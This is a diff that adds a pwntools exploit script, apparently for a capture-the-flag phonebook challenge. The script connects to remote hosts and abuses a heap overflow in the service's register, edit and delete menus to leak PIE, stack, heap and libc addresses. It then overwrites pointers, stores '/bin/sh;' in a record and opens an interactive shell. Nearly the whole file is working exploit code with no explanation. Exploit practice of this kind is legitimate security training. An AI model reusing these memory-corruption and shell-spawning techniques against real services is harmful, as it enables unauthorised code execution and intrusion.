@@ -1,0 +1,80 @@
+from pwn import *
+
+#s = remote('45.32.49.167',1234)
+s = remote('35.187.198.163', 31259)
+#s = remote('192.168.0.85',1234)
+s.recvuntil('num:')
+s.send('100\n')
+raw_input()
+def reg(name,number,birth):
+  s.recvuntil('>')
+  s.send('1\n')
+  s.recvuntil('Name : ')
+  s.send(name)
+  s.recvuntil('number : ')
+  s.send(number)
+  s.recvuntil('Birth : ')
+  s.send(birth)
+def delete(index):
+  s.recvuntil('>')
+  s.send('3\n')
+  s.recvuntil('Index :')
+  s.send(str(index)+'\n')
+def show():
+  s.recvuntil('>')
+  s.send('2\n')
+def edit(index,which,dat):
+  s.recvuntil('Select_menu >')
+  s.send('4\n')
+  s.recvuntil(':')
+  s.send(str(index)+'\n')
+  s.recvuntil('>')
+  s.send(str(which)+'\n')
+  s.recvuntil(':')
+  s.send(dat)
+reg('A'*0x28,'A'*0x8,'A'*0x8)
+edit(1,1,'A'*0x28)
+show()
+r = s.recvuntil('Phone')
+stack = u32(r[0x6b:0x6b+4])
+pie = u32(r[0x67:0x67+4]) - 0x01829 #- 0x1da000
+log.info('PIE : 0x%x'%pie)
+log.info('STACK : 0x%x'%stack)
+reg('A'*0x8,'D'*0x8,'A'*0x8)
+reg('A'*0x8,'B'*0x8,'A'*0x8)
+reg('A'*0x8,'C'*0x8,'A'*0x8)
+
+reg('B'*0x28,'A'*0xc,'A'*0x18)
+reg('B'*0x8,'A'*0x8,'A'*0x8)
+reg('B'*0x8,'A'*0x8,'A'*0x8)
+reg('B'*0x8,'A'*0x8,'A'*0x8)
+delete(8)
+reg('P'*0x18,'A'*0x13+'\x00\x31','A'*0x28)
+reg('C'*0x8,'C'*0x8,'C'*0x8)
+delete(9)
+reg('D'*0x20+p32(stack+0x48)*3,'A'*0x28,'A'*0x28) #pie+0x002FB4
+show()
+heap = u32(s.recvuntil('<<6>>')[0x153:0x153+4]) #- 0x76840
+s.recvuntil('Select')
+log.info('HEAP : 0x%x'%heap)
+reg('L'*0x8,'K'*0x8,'K'*0x8)
+reg('K'*0x8,'/bin/sh;','K'*0x8)
+delete(11)
+edit(11,1,p32(heap+0x238))
+edit(11,3,p32(stack+0x0c))
+show()
+libc = u32(s.recvuntil('<<3>>')[0x7c:0x7c+4]) - 0x1acac0
+log.info('LIBC : 0x%x'%libc)
+edit(11,1,p32(heap+0x4b0))
+edit(11,3,p32(libc+0x40310))
+
+edit(11,1,p32(heap+0x19c))
+edit(11,3,p32(heap+0x4b0))
+
+edit(11,1,p32(heap+0x27c))
+edit(11,3,p32(libc+0x1ad8d8))
+'''
+reg('t'*0x28,'y'*0x28,'d'*0x28)
+reg('t'*0x20+p32(stack+0x48)+p32(libc+0x1010)+p32(libc+0x1040),'A'*0x28,'A'*0x28) 
+'''
+s.interactive()
